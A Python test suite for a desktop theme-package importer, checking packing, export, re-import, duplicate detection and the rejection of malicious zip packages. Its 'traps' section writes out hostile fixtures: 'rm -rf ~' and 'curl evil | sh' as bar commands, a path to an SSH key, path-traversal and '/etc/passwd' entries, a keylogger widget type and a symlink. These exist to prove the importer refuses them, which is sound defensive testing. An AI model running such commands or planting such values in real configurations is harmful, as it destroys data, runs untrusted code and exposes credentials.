# SPDX-License-Identifier: GPL-3.0-or-later
"""Run: python3 tests/test_package.py  (sandboxed in a temp dir, never touches the real session)"""
import os
import stat
import sys
import tempfile
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
SANDBOX = Path(tempfile.mkdtemp(prefix="noctalia-themes-pkg-"))
for var in ("NOCTALIA_CONFIG_HOME", "NOCTALIA_STATE_HOME", "NOCTALIA_THEMES_HOME", "NOCTALIA_THEMES_CONFIG",
            "NOCTALIA_THEMES_FONTS", "NOCTALIA_DATA_HOME"):
    os.environ[var] = str(SANDBOX / var)
os.environ["PATH"] = ""
os.environ["LANGUAGE"] = "en"  # assertions match the English messages
sys.path.insert(0, str(ROOT / "app"))
import installer  # noqa: E402
import package  # noqa: E402
from paths import LIBRARY  # noqa: E402


def refused(zip_path, needle):
    try:
        package.import_zip(zip_path)
    except ValueError as e:
        assert needle in str(e), f"{needle!r} not in {e}"
        return
    raise AssertionError(f"{zip_path.name} was imported")


def rezip(src, name, edit=None, extra=None):
    """Copy a package, renaming its folder to `name`, editing files with edit(path, bytes) and adding `extra`."""
    out = SANDBOX / f"{name}-{len(list(SANDBOX.glob('*.zip')))}.zip"
    with zipfile.ZipFile(src) as zin, zipfile.ZipFile(out, "w") as zout:
        for i in zin.infolist():
            rel = i.filename.split("/", 1)[1]
            data = zin.read(i)
            zout.writestr(f"{name}/{rel}", edit(rel, data) if edit else data)
        for arc, data in (extra or {}).items():
            zout.writestr(arc, data)
    return out


# The skeleton passes its own checks; every shipped theme packs (built-in themes follow the import rules too).
skeleton = package.new(SANDBOX / "work" / "disco-inferno")
assert package.check(skeleton) == [], package.check(skeleton)
brume = package.pack(ROOT / "themes" / "brume", SANDBOX)
assert brume.name == "brume-1.0.0.zip"
with zipfile.ZipFile(brume) as z:
    assert all(n.startswith("brume/") for n in z.namelist()) and "brume/theme.toml" in z.namelist()

# Export to a chosen file (the app's "Save as"): no temp file left, and the result imports back.
(SANDBOX / "export").mkdir()
chosen = package.pack(skeleton, SANDBOX / "export" / "for-a-friend.zip")
assert chosen.is_file() and not list(chosen.parent.glob("*.part")), list(chosen.parent.iterdir())
assert package.archive_name(skeleton) == "disco-inferno-1.0.0.zip"
package.import_zip(chosen)
assert (LIBRARY / "disco-inferno" / "theme.toml").is_file()
package.remove("disco-inferno")

# A built-in theme can't be replaced by a package.
refused(brume, "built-in")


def as_fog(rel, data):
    """Brume renamed 'fog': folder, palette and name all follow."""
    text = data.decode() if rel.endswith(".toml") else None
    if rel == "theme.toml":
        return text.replace('name = "Brume"', 'name = "Fog"').replace('palette = "brume"', 'palette = "fog"').encode()
    if rel == "noctalia.toml":
        return text.replace('custom_palette = "brume"', 'custom_palette = "fog"').encode()
    return data


fog = rezip(brume, "fog", as_fog)
meta = package.import_zip(fog)
assert meta["name"] == "Fog" and (LIBRARY / "fog" / "theme.toml").is_file()
listed = {t["name"]: t["imported"] for t in installer.list_themes()}
assert listed["Fog"] is True and listed["Brume"] is False
assert package.existing("fog")["version"] == "1.0.0"
package.import_zip(fog)  # same folder again: replaced, still one copy
assert [t["name"] for t in installer.list_themes(LIBRARY)] == ["Fog"]


def fragment_with(extra):
    return lambda rel, data: (as_fog(rel, data) + extra.encode()) if rel == "noctalia.toml" else as_fog(rel, data)


# Duplicates of an imported theme: identical files are spotted (the app then skips the question), a changed one is not.
assert package.same_files(fog, "fog")
assert not package.same_files(rezip(brume, "fog", fragment_with("\n# a bar of soap, not a theme change\n")), "fog")
assert not package.same_files(rezip(brume, "fog", as_fog, {"fog/wallpapers/extra.webp": b"RIFF"}), "fog")
assert [package.compare_versions(*v) for v in (("1.10.0", "1.9.2"), ("1.0.0", "1.0.0"), ("0.9", "1.0"),
                                                ("beta", "1.0"))] == [1, 0, -1, 1]

# Traps: each must be refused and leave the library as it was.
refused(rezip(brume, "fog2", as_fog, {"stowaway/theme.toml": "x"}), "one theme folder")
refused(rezip(brume, "fog", as_fog, {"fog/../../escape.toml": "x"}), "Unsafe path")
refused(rezip(brume, "fog", as_fog, {"/etc/passwd": "x"}), "Unsafe path")
refused(rezip(brume, "fog", fragment_with('\n[session]\nlock_command = "rm -rf ~"\n')), "[session] is not allowed")
refused(rezip(brume, "fog", fragment_with('\n[bar.default.widget.x]\nleft_click_command = "curl evil | sh"\n')),
        "can run a program")
refused(rezip(brume, "fog", fragment_with('\n[bar.hooks]\non_start = "touch /tmp/pwned"\n')), "can run a program")
refused(rezip(brume, "fog", fragment_with('\n[desktop_widgets.widget.x]\nimage_path = "/home/someone/.ssh/id"\n')),
        "must point inside the theme")
refused(rezip(brume, "fog", fragment_with('\n[desktop_widgets.widget.x]\nimage_path = "@THEME_DIR@/../../x"\n')),
        "must point inside the theme")
refused(rezip(brume, "fog", fragment_with('\n[desktop_widgets.widget.x]\ntype = "someone/keylogger:spy"\n')),
        "must point inside the theme")
refused(rezip(brume, "fog", as_fog, {"fog/stickers/run.sh": "#!/bin/sh"}), "file type not allowed")
refused(rezip(brume, "fog", lambda r, d: as_fog(r, d).replace(b'palette = "fog"', b'palette = "brume"')),
        "must be the folder name")
refused(rezip(brume, "other", lambda r, d: as_fog(r, d).replace(b'palette = "fog"', b'palette = "other"')),
        "already named")
link = SANDBOX / "link.zip"
with zipfile.ZipFile(fog) as zin, zipfile.ZipFile(link, "w") as zout:
    for i in zin.infolist():
        zout.writestr(i, zin.read(i))
    info = zipfile.ZipInfo("fog/wallpapers/evil.webp")
    info.external_attr = (stat.S_IFLNK | 0o777) << 16
    zout.writestr(info, "/home")
refused(link, "Symbolic links")
not_zip = SANDBOX / "cat.zip"
not_zip.write_text("meow")
refused(not_zip, "not a .zip")
assert [t["name"] for t in installer.list_themes(LIBRARY)] == ["Fog"]
assert not list(LIBRARY.parent.glob(".import-*")), "a staging folder was left behind"

# The plugin shipped with the app is allowed.
assert package.check_fragment('[desktop_widgets.widget.p]\ntype = "billisdead/theme-widgets:player"\n') == []
assert package.check_fragment('[desktop_widgets.widget.p]\ndescription = "a quiet script-free note"\n') == []

package.remove("fog")
assert installer.list_themes(LIBRARY) == []
try:
    package.remove("../themes")
    raise AssertionError("removed outside the library")
except ValueError:
    pass
print("ok")
